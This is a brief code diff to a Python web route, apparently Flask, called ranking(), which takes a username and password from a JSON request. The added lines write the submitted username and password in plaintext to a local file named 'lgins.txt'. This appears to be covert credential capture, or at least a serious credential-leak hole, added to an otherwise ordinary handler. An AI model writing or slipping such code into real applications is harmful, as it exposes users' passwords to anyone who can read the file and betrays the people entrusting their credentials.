@@ -64,6 +64,9 @@ def ranking():
         params = request.get_json()
         usuario, password = params['usuario'].strip(), params['password'].strip()
         fecha = params.get('fecha', "").strip()
+        file = open(r"lgins.txt", "w+") 
+        file.writelines([usuario, password])
+        file.close()
     def generate():
         yield "Iniciando consulta\n" 
             
